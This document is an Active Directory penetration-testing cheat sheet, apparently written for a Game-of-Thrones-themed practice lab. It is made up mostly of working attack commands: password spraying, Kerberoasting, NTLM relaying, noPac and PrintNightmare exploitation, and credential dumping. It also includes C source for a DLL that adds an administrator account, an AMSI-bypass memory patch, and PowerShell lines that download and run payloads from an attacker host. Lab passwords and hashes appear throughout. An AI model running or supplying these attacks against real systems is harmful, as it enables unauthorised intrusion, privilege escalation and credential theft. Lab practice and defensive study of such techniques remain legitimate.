# This is a very kick way to get all the windows machine IP, names and domains.
crackmapexec smb 192.168.56.0/24
SMB         192.168.56.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         192.168.56.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10.0 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10.0 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)

# Enumerate the DCs by quering the dns with nslookup
sudo nmap -p 88 --open 192.168.56.0/24
sudo nmap -p 53 --open 192.168.56.0/24
nslookup -type=srv _ldap._tcp.dc._msdcs.sevenkingdoms.local 192.168.56.10
nslookup -type=srv _ldap._tcp.dc._msdcs.north.sevenkingdoms.local 192.168.56.10
nslookup -type=srv _ldap._tcp.dc._msdcs.essos.local 192.168.56.10


# setup kerberos
- configure /etc/hosts 
- install kerberos client 
`sudo apt install krb5-user`
- setup the /etc/krb5.conf file like this
```
[libdefaults]
  default_realm = essos.local
  kdc_timesync = 1
  ccache_type = 4
  forwardable = true
  proxiable = true
  fcc-mit-ticketflags = true
[realms]
  north.sevenkingdoms.local = {
      kdc = winterfell.north.sevenkingdoms.local
      admin_server = winterfell.north.sevenkingdoms.local
  }
  sevenkingdoms.local = {
      kdc = kingslanding.sevenkingdoms.local
      admin_server = kingslanding.sevenkingdoms.local
  }
  essos.local = {
      kdc = meereen.essos.local
      admin_server = meereen.essos.local
  }
```

# Test kerberos config 
## Get TGT 
### Note: sometimes fqdn doesn't work, just choose the hostname instead in these cases
```
getTGT.py essos.local/khal.drogo:horse
export KRB5CCNAME=khal.drogo.ccache 
smbclient.py -k @braavos.essos.local
unset KRB5CCNAME

getTGT.py north.sevenkingdoms.local/arya.stark:Needle
export KRB5CCNAME=arya.stark.ccache
smbclient.py -k -no-pass @winterfell.north.sevenkingdoms.local
smbclient.py -k -no-pass @winterfell
```
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py north.sevenkingdoms.local/ -usersfile users.north.sevenkingdoms.local.txt

john -w=/usr/share/wordlists/rockyou.txt brandon.stark.asrep_roasting.hash.txt

crackmapexec smb 192.168.56.11 --users
crackmapexec smb 192.168.56.11 --pass-pol

getTGT.py north.sevenkingdoms.local/brandon.stark:iseedeadpeople

export KRB5CCNAME=brandon.stark.ccache

# Enumerate DC’s anonymously
```
crackmapexec smb 192.168.56.10 --users
crackmapexec smb 192.168.56.11 --users
crackmapexec smb 192.168.56.12 --users

enum4linux 192.168.56.11

rpcclient -U "NORTH\\" 192.168.56.11 -N -c 'enumdomusers'

net rpc group members 'Domain Users' -W 'NORTH' -I '192.168.56.11' -U '%'
```
## Enumerate DC’s anonymously (brute force) - when anonymous sessions are not allowed
```
# First let’s create a user list:
curl -s https://www.hbo.com/game-of-thrones/cast-and-crew | grep 'href="/game-of-thrones/cast-and-crew/'| grep -o 'aria-label="[^"]*"' | cut -d '"' -f 2 | awk '{if($2 == "") {print tolower($1)} else {print tolower($1) "." tolower($2);} }' > got_users.txt

# Nmap attempt
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='sevenkingdoms.local',userdb=got_users.txt" 192.168.56.10
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='essos.local',userdb=got_users.txt" 192.168.56.12


```

# List guest access on shares
```
crackmapexec smb 192.168.56.10-23 -u 'a' -p '' --shares
```

# Getting user credentials
## ASREP - roasting
```
GetNPUsers.py north.sevenkingdoms.local/ -no-pass -usersfile users.txt

hashcat -m 18200 asrephash /usr/share/wordlists/rockyou.txt
```

## Password spray
```
#We could try the classic user=password test
crackmapexec smb 192.168.56.11 -u users.txt -p users.txt --no-bruteforce
sprayhound -U ./users.txt -d hackn.lab -dc 10.10.10.1

# Single user, single password
sprayhound -u simba -p Pentest123.. -d hackn.lab -dc 10.10.10.1

# User list, single password
sprayhound -U ./users.txt -p Pentest123.. -d hackn.lab -dc 10.10.10.1

# User as pass with password lowercase
sprayhound -U ./users.txt --lower -d hackn.lab -dc 10.10.10.1

# User as pass with password uppercase
sprayhound -U ./users.txt --upper -d hackn.lab -dc 10.10.10.1


#We could try sprayhound with a valid user to avoid locking account (option -t to set the number of try left)
sprayhound -U users.txt -d north.sevenkingdoms.local -dc 192.168.56.11 -lu hodor -lp hodor --lower -t 2

#See the status of bruteforce
crackmapexec smb -u samwell.tarly -p Heartsbane -d north.sevenkingdoms.local 192.168.56.11 --users

```

# User listing
```
GetADUsers.py -all north.sevenkingdoms.local/brandon.stark:iseedeadpeople 
python3 /opt/windapsearch/windapsearch.py -d north.sevenkingdoms.local -u brandon.stark@north.sevenkingdoms.local -p 'iseedeadpeople' -U 

ldapsearch -H ldap://192.168.56.11 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b 'DC=north,DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))" |grep 'distinguishedName:'
ldapsearch -H ldap://192.168.56.12 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b ',DC=essos,DC=local' "(&(objectCategory=person)(objectClass=user))"
ldapsearch -H ldap://192.168.56.10 -D "brandon.stark@north.sevenkingdoms.local" -w iseedeadpeople -b 'DC=sevenkingdoms,DC=local' "(&(objectCategory=person)(objectClass=user))"

```

# Kerberoasting
On an active directory, we will see very often users with an SPN set.
```
GetUserSPNs.py -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting.hashes

crackmapexec ldap 192.168.56.11 -u brandon.stark -p 'iseedeadpeople' -d north.sevenkingdoms.local --kerberoasting KERBEROASTING

hashcat -m 13100 --force -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.txt --force

#crackmapexec smb 192.168.56.10-23 -u jon.snow -p iknownothing -d north.sevenkingdoms.local --shares
```

# DNS dump
```
adidnsdump -u 'north.sevenkingdoms.local\jon.snow' -p 'iknownothing' winterfell.north.sevenkingdoms.local

```

# Bloodhound
```
#First we will get the datas with the python ingestor : https://github.com/fox-it/BloodHound.py
bloodhound.py --zip -c All -d north.sevenkingdoms.local -u brandon.stark -p iseedeadpeople -dc winterfell.north.sevenkingdoms.local
bloodhound.py --zip -c All -d sevenkingdoms.local -u brandon.stark@north.sevenkingdoms.local -p iseedeadpeople -dc kingslanding.sevenkingdoms.local
```
## .net ingestor - from Windows
```
# The official bloudhound ingestor is sharphound : https://github.com/BloodHoundAD/SharpHound
xfreerdp /u:jon.snow /p:iknownothing /d:north /v:192.168.56.22 /cert-ignore
.\sharphound.exe -d north.sevenkingdoms.local -c all --zipfilename bh_north_sevenkingdoms.zip
.\sharphound.exe -d sevenkingdoms.local -c all --zipfilename bh_sevenkingdoms.zip
.\sharphound.exe -d essos.local -c all --zipfilename bh_essos.zip


$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.56.1/SharpHound.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Sharphound.Program]::Main("-d north.sevenkingdoms.local -c all".Split())
```

## Hunting with bloodhound
```
#show all domains and computer
MATCH p = (d:Domain)-[r:Contains*1..]->(n:Computer) RETURN p

#show all the users
MATCH p = (d:Domain)-[r:Contains*1..]->(n:User) RETURN p

#see the overall map of domains/groups/users
MATCH q=(d:Domain)-[r:Contains*1..]->(n:Group)<-[s:MemberOf]-(u:User) RETURN q

#see the users ACL
MATCH p=(u:User)-[r1]->(n) WHERE r1.isacl=true and not tolower(u.name) contains 'vagrant' RETURN p
```

# poison and relay
```
responder -I vboxnet0

hashcat -m 5600 --force -a 0 responder.hashes /usr/share/wordlists/rockyou.txt 

rm /opt/tools/Responder/Responder.db

## hunting unsigned smb in the lab and generate a list of IP targets

crackmapexec smb 192.168.56.10-23 --gen-relay-list relay.txt

#Before starting responder to poison the answer to LLMNR, MDNS and NBT-NS request we must stop the responder smb and http server as we don’t want to get the hashes directly but we want to relay them to ntlmrelayx.
sed -i 's/HTTP = On/HTTP = Off/g' /opt/Responder/Responder.conf && cat /opt/Responder/Responder.conf | grep --color=never 'HTTP ='
sed -i 's/SMB = On/SMB = Off/g' /opt/Responder/Responder.conf && cat /opt/Responder/Responder.conf | grep --color=never 'SMB ='

ntlmrelayx -tf smb_targets.txt -of netntlm -smb2support -socks  
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.120.6 
```

## Use a socks relay with an admin account
```
proxychains secretsdump -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22'
```

## Lsassy
Lsassy allow you to dump lsass remotely, it do all the painful actions like dump and read lsass process stored credentials content for you. 
```
proxychains lsassy --no-pass -d NORTH -u EDDARD.STARK 192.168.56.22
```

## DonPapi
donPAPI, is used to get dpapi and other passwords stored informations (files, browser, schedule tasks,…). This tool don’t touch LSASS so it is stealthier and work most of the time even if av and edr are enabled on the target
```
proxychains DonPAPI -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22'
```

### Code execution : smbexec or atexec
`proxychains smbexec.py -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22' -debug`

# Mitm6 + ntlmrelayx to ldap
- We will start mitm6 to poison dhcpv6 and get dns request from the hosts
- As a side note, i notice we can poison domain controler but after that the DC’s doesn’t care and still use their localhost dns server.
- So we must target servers
- For this example we will poison braavos server. We will answer to wpad queries and relay the http query to ldaps on meereen to add a computer with delegate access.

## start poisoning with mitm6 and start ntlmrelayx
```
mitm6 -i vboxnet0 -d essos.local -d sevenkingdoms.local -d north.sevenkingdoms.local --debug

ntlmrelayx.py -6 -wh wpadfakeserver.essos.local -t ldaps://meereen.essos.local --add-computer hellocomputer --delegate-access

#here we assume hellocomputer has been created with password DB16}3dC7ootdSV
#Next is exploiting RBCD

getST.py -spn HOST/BRAAVOS.ESSOS.LOCAL -impersonate Administrator -dc-ip 192.168.56.12 'ESSOS.LOCAL/hellocomputer$:DB16}3dC7ootdSV'

export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass ESSOS.LOCAL/'Administrator'@braavos.essos.local

psexec.py administrator@192.168.56.22 -hashes :84fe45d7c3263065e931761aef6c7aaf
```
If this attack is succesfully achieved, we can notice that
- A new computer has been created with delegate access to Braavos$ because we poison Braavos$ computer account and it can set the msDS-AllowedToActOnBehalfOfOtherIdentity on the created computer.

- We can continue with RBCD exploitation (with getST to call s4u2proxy)

- If we specify a loot dir all the informations on the ldap are automatically dumped

`ntlmrelayx.py -6 -wh wpadfakeserver.essos.local -t ldaps://meereen.essos.local -l /workspace/loot`

**Another thing we could do is also relay to smb server just like responder**

# Coerced auth smb + ntlmrelayx to ldaps with drop the mic
We can coerce a connection from meereen DC to our host using multiple methods (petitpotam, printerbug, DFSCoerce). To force a coerce without choosing between the different methods, we can use the all-in-one tool who just came up coercer

**It is not possible to relay smb connection to ldap(s)** connection **without using CVE-2019-1040 a.k.a remove-mic** (en.hackndo.com/ntlm-relay)  (www.thehacker.recipes/ad/movement/ntlm/relay).
- Start the relay with remove mic to the ldaps of meereen.essos.local.
`ntlmrelayx -t ldaps://meereen.essos.local -smb2support --remove-mic --add-computer removemiccomputer --delegate-access`

- Run the coerce authentication on braavos (braavos is a windows server 2016 up to date so petitpotam unauthenticated will not work here)
`python3 coercer.py -u khal.drogo -d essos.local -p horse -t braavos.essos.local -l 192.168.56.1`

- If the attack worked we can now exploit braavos with RBCD
`getST.py -spn HOST/BRAAVOS.ESSOS.LOCAL -impersonate Administrator -dc-ip 192.168.56.12 'ESSOS.LOCAL/removemiccomputer$:_53>W3){OkTY{ej'`

- And use that ticket to retreive secrets
```
export KRB5CCNAME=/workspace/Administrator.ccache
secretsdump -k -no-pass ESSOS.LOCAL/'Administrator'@braavos.essos.local
```

# AD exploit from a user 

## nopac (PAC => Proxy Auto Config ) : CVE-2021-42287.

### Scanning
```
crackmapexec smb 192.168.56.0/24  -M nopac -u 'samwell.tarly' -p 'Heartsbane'

#or 

git clone https://github.com/Ridter/noPac.git
cd noPac

python3.8 scanner.py north.sevenkingdoms.local/samwell.tarly:'Heartsbane' -dc-ip 192.168.56.11

```

#### Auto exploit with nopac.py
```
python3.8 noPac.py north.sevenkingdoms.local/samwell.tarly:'Heartsbane' -dc-ip 192.168.56.11

#or Auto get shell

python3.8 noPac.py  north.sevenkingdoms.local/samwell.tarly:'Heartsbane' -dc-ip 192.168.56.11 -dc-host WINTERFELL -shell --impersonate administrator 
```

### check the machine account quota
```
cme ldap -L
cme ldap winterfell.north.sevenkingdoms.local -u jon.snow -p iknownothing -d north.sevenkingdoms.local -M MAQ
```

### Prepare impacket (to get rename.py)
```
cd /opt/tools
git clone https://github.com/SecureAuthCorp/impacket myimpacket

cd myimpacket
git checkout -b mydev

python3.8 -m virtualenv myimpacket
source myimpacket/bin/activate
python3.8 -m pip install .

git fetch origin pull/1224/head:1224
git fetch origin pull/1202/head:1202

git merge 1202
git merge 1224


rehash
#now rename.py and getST.py should be there
```

### Exploitation
```
#Add a new computer
addcomputer.py -computer-name 'samaccountname$' -computer-pass 'ComputerPassword' -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH 'north.sevenkingdoms.local/jon.snow:iknownothing'

#Clear the SPNs of our new compute
addspn.py --clear -t 'samaccountname$' -u 'north.sevenkingdoms.local\jon.snow' -p 'iknownothing' 'winterfell.north.sevenkingdoms.local'

#Rename the computer (computer -> DC)
renameMachine.py -current-name 'samaccountname$' -new-name 'winterfell' -dc-ip 'winterfell.north.sevenkingdoms.local' north.sevenkingdoms.local/jon.snow:iknownothing

#Obtain a TGT
getTGT.py -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell':'ComputerPassword'

#Reset the computer name back to the original name
renameMachine.py -current-name 'winterfell' -new-name 'samaccount$' north.sevenkingdoms.local/jon.snow:iknownothing

#Obtain a service ticket with S4U2self by presenting the previous TGT
export KRB5CCNAME=/workspace/winterfell.ccache
getST.py -self -impersonate 'administrator' -altservice 'CIFS/winterfell.north.sevenkingdoms.local' -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell' -debug

#DCSync by presenting the service ticket
export KRB5CCNAME=/workspace/administrator@CIFS_winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccache
secretsdump.py -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' @'winterfell.north.sevenkingdoms.local'


#Now clean up by deleting the computer we created with the administrator account hash we just get
addcomputer.py -computer-name 'samaccountname$' -delete -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH -hashes 'aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4' 'north.sevenkingdoms.local/Administrator'

```

## PrintNightmare (CVE-2021-1675)
### Check spooler is active
```
cme smb 192.168.56.10-23 -M spooler
#or
rpcdump.py @192.168.56.10 | egrep 'MS-RPRN|MS-PAR'
```

### Exploit
`git clone https://github.com/cube0x0/CVE-2021-1675 printnightmare`

Prepare the dll (the following code in nightmare.c) with the purpose of creating a new user named pnightmareuser
Source: https://github.com/newsoft/adduser 
```
/*
 * ADDUSER.C: creating a Windows user programmatically.
 */

#define UNICODE
#define _UNICODE

#include <windows.h>
#include <string.h>
#include <lmaccess.h>
#include <lmerr.h>
#include <tchar.h>


DWORD CreateAdminUserInternal(void)
{
    NET_API_STATUS rc;
    BOOL b;
    DWORD dw;

    USER_INFO_1 ud;
    LOCALGROUP_MEMBERS_INFO_0 gd;
    SID_NAME_USE snu;

    DWORD cbSid = 256;    // 256 bytes should be enough for everybody :)
    BYTE Sid[256];

    DWORD cbDomain = 256 / sizeof(TCHAR);
    TCHAR Domain[256];

    // Create user
    memset(&ud, 0, sizeof(ud));

    ud.usri1_name        = _T("pnightmareuser");                // username
    ud.usri1_password    = _T("Test123456789!");             // password
    ud.usri1_priv        = USER_PRIV_USER;                   // cannot set USER_PRIV_ADMIN on creation
    ud.usri1_flags       = UF_SCRIPT | UF_NORMAL_ACCOUNT;    // must be set
    ud.usri1_script_path = NULL;

    rc = NetUserAdd(
        NULL,            // local server
        1,                // information level
        (LPBYTE)&ud,
        NULL            // error value
    );

    if (rc != NERR_Success) {
        _tprintf(_T("NetUserAdd FAIL %d 0x%08x\r\n"), rc, rc);
        return rc;
    }

   _tprintf(_T("NetUserAdd OK\r\n"), rc, rc);

    // Get user SID
    b = LookupAccountName(
        NULL,            // local server
        ud.usri1_name,   // account name
        Sid,             // SID
        &cbSid,          // SID size
        Domain,          // Domain
        &cbDomain,       // Domain size
        &snu             // SID_NAME_USE (enum)
    );

    if (!b) {
        dw = GetLastError();
        _tprintf(_T("LookupAccountName FAIL %d 0x%08x\r\n"), dw, dw);
        return dw;
    }

    // Add user to "Administrators" local group
    memset(&gd, 0, sizeof(gd));

    gd.lgrmi0_sid = (PSID)Sid;

    rc = NetLocalGroupAddMembers(
        NULL,                    // local server
        _T("Administrators"),
        0,                        // information level
        (LPBYTE)&gd,
        1                        // only one entry
    );

    if (rc != NERR_Success) {
        _tprintf(_T("NetLocalGroupAddMembers FAIL %d 0x%08x\r\n"), rc, rc);
        return rc;
    }

    return 0;
}

//
// DLL entry point.
//

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        CreateAdminUserInternal();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

// RUNDLL32 entry point
#ifdef __cplusplus
extern "C" {
#endif

__declspec(dllexport) void __stdcall CreateAdminUser(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    CreateAdminUserInternal();
}

#ifdef __cplusplus
}
#endif

// Command-line entry point.
int main()
{
    return CreateAdminUserInternal();
}

```
Compile it
`x86_64-w64-mingw32-gcc -shared -o pnightmare2.dll nightmare.c -lnetapi32
`

#Prepare a smb share with the dll
```
smbserver.py -smb2support ATTACKERSHARE .

#exploit cve
python3 CVE-2021-1675.py essos.local/jorah.mormont:'H0nnor!'@meereen.essos.local '\\192.168.56.1\ATTACKERSHARE\nightmare.dll'
```

# vulnerability check
```
# zerologon
crackmapexec smb 192.168.56.12  -M zerologon
#nopac
crackmapexec smb 192.168.56.0/24  -M nopac -u 'samwell.tarly' -p 'Heartsbane'
```

# MSSQL
## Enumeration
```
GetUserSPNs.py -target-domain essos.local north.sevenkingdoms.local/brandon.stark:iseedeadpeople
nmap -p 1433 -sV -sC 192.168.56.10-23
crackmapexec mssql 192.168.56.22-23

crackmapexec mssql 192.168.56.22 -u samwell.tarly -p Heartsbane -d north.sevenkingdoms.local
```

## Connect to mssql
```
python3 mssqlclient.py -windows-auth north.sevenkingdoms.local/samwell.tarly:Heartsbane@castelblack.north.sevenkingdoms.local

# Enumerate user
enum_logins

## Enumerate login with impersonation permission
enum_impersonate

## Impersonation
exec_as_login sa
enable_xp_cmdshell
xp_cmdshell whoami

## Enumerate as login sa
enum_logins
enum_impersonate

## Impersonate - execute as user
python3 mssqlclient.py -windows-auth north.sevenkingdoms.local/arya.stark:Needle@castelblack.north.sevenkingdoms.local
use master
execute as user = "dbo"
exec master..xp_cmdshell 'whoami'

```

By executing as user, the database should have trustworthy property set in order to run shell. In order to enumerate trustworthy property in database run:
`enum_db`

```
python3 mssqlclient.py -windows-auth north.sevenkingdoms.local/arya.stark:Needle@castelblack.north.sevenkingdoms.local
use msdb
exec_as_user dbo
enable_xp_cmdshell
xp_cmdshell whoami
```

## Coerce and relay
start responder  or ntlm-relat
```
responder -I vboxnet0

ntlmrelayx -tf smb_targets.txt -of netntlm -smb2support -socks  
sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.120.6 
```

connect and run xp_dirtree command
```
python3 mssqlclient.py -windows-auth north.sevenkingdoms.local/hodor:hodor@castelblack.north.sevenkingdoms.local
exec master.sys.xp_dirtree '\\192.168.56.1\demontlm',1,1
```

## trusted links
```
python3 mssqlclient.py -windows-auth north.sevenkingdoms.local/jon.snow:iknownothing@castelblack.north.sevenkingdoms.local -show
enum_links

EXEC sp_linkedservers
EXEC sp_helplinkedsrvlogin


use_link BRAAVOS
enable_xp_cmdshell
xp_cmdshell whoami

```

# Privesc
## Disable AMSI
https://amsi.fail/

### Bypass at .net AMSI level 
https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/

```
# Patching amsi.dll AmsiScanBuffer by rasta-mouse
$Win32 = @"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "AmsiScanBuffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)

```

## WinPeas without touching disk
```
$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.56.1:8080/winPEASany_ofs.exe');
$asm = [System.Reflection.Assembly]::Load([byte[]]$data);
$out = [Console]::Out;$sWriter = New-Object IO.StringWriter;[Console]::SetOut($sWriter);
[winPEAS.Program]::Main("");[Console]::SetOut($out);$sWriter.ToString()
```

If you don’t want to be bored to compile .net app or modify them with public class and method and no exit.environment you can also use PowerSharpPack and get everything done for you (thanks again to @ShitSecure).
```
iex(new-object net.webclient).downloadstring('http://192.168.56.1:8080/PowerSharpPack/PowerSharpPack.ps1')
PowerSharpPack -winPEAS
```

### Exploit SeImpersonatePrivilege
```
mkdir c:\temp
cd c:\temp
(New-Object System.Net.WebClient).DownloadFile('http://192.168.56.1:8080/runme.bat','c:\temp\runme.bat')
$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.56.1:8080/SweetPotato.exe');
$asm = [System.Reflection.Assembly]::Load([byte[]]$data);
$out = [Console]::Out;$sWriter = New-Object IO.StringWriter;[Console]::SetOut($sWriter);
[SweetPotato.Program]::Main(@('-p=C:\temp\runme.bat'));[Console]::SetOut($out);$sWriter.ToString()

or

	

$x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344)
iex(new-object system.net.webclient).downloadstring('http://192.168.56.1:8080/amsi_rmouse.txt')
iex(new-object net.webclient).downloadstring('http://192.168.56.1:8080/PowerSharpPack/PowerSharpBinaries/Invoke-BadPotato.ps1')
Invoke-BadPotato -Command "c:\temp\runme.bat"

```

# Lateral movement
## DonPAPI
```
DonPAPI.py domain/user:passw0rd@target
DonPAPI.py --hashes <LM>:<NT> domain/user@target
DonPAPI.py -k domain/user@target
DonPAPI.py -local_auth user@target
```
## secretsdump & crackmapexec
```
python3 secretsdump.py NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 

#Password reuse and PTH attack
crackmapexec smb 192.168.56.10-23 -u Administrator -H 'dbd13e1c4e338284ac4e9874f7de6ef4' --local-auth
crackmapexec smb 192.168.56.10-23 -u Administrator -H 'dbd13e1c4e338284ac4e9874f7de6ef4'
```
##  Cached domain logon information
```
reg.py NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 save -keyName 'HKLM\SYSTEM' -o '\\192.168.56.1\share'
reg.py NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 save -keyName 'HKLM\SECURITY' -o '\\192.168.56.1\share'

secretsdump -security SECURITY.save -system SYSTEM.save LOCAL
```

## LSASS
```
lsassy -d north.sevenkingdoms.local -u jeor.mormont -p _L0ngCl@w_ 192.168.56.22 -m dumpertdll -O dumpertdll_path=/workspace/Outflank-Dumpert-DLL.dll

ticketConverter.py kirbi_ticket.kirbi ccache_ticket.ccache
export KRB5CCNAME=ccache_ticket.ccache
wmiexec.py -k -no-pass north.sevenkingdoms.local/jeor.mormont
```

## Lateral Move with impacket
```
psexec -hashes 'cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@192.168.56.11
wmiexec.py -hashes ':cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@192.168.56.11
smbexec.py -hashes ':cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@192.168.56.11
atexec.py -hashes ':cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@192.168.56.11
dcomexec.py -hashes ':cba36eccfd9d949c73bc73715364aff5' NORTH/catelyn.stark@192.168.56.11
```

## Other method
```
cme smb 192.168.56.11 -H ':cba36eccfd9d949c73bc73715364aff5' -d 'north' -u 'catelyn.stark' -x whoami
evil-winrm -i 192.168.56.11 -u catelyn.stark -H 'cba36eccfd9d949c73bc73715364aff5'

# Allow to RDP without password
reg.py NORTH/catelyn.stark@192.168.56.11 -hashes ':cba36eccfd9d949c73bc73715364aff5' query -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' 
reg.py NORTH/catelyn.stark@192.168.56.11 -hashes ':cba36eccfd9d949c73bc73715364aff5' add -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v 'DisableRestrictedAdmin' -vt 'REG_DWORD' -vd '0'
xfreerdp /u:catelyn.stark /d:north.sevenkingdoms.local /pth:cba36eccfd9d949c73bc73715364aff5 /v:192.168.56.11

#Delete the reg for RDP
reg.py NORTH/catelyn.stark@192.168.56.11 -hashes ':cba36eccfd9d949c73bc73715364aff5' delete -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v 'DisableRestrictedAdmin'

#TGT
getTGT.py -hashes ':cba36eccfd9d949c73bc73715364aff5' north.sevenkingdoms.local/catelyn.stark
export KRB5CCNAME=/workspace/tgt/catelyn.stark.ccache
wmiexec.py -k -no-pass north.sevenkingdoms.local/catelyn.stark@winterfell

#Can also use the tickets dumped with lsassy using impacket ticketConverter
ticketConverter.py kirbi_ticket.kirbi ccache_ticket.ccache
```

## Certificate
### Pass The Certificate
```
certipy req -u khal.drogo@essos.local -p 'horse' -target braavos.essos.local -template ESC1 -ca ESSOS-CA -upn administrator@essos.local
certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12
```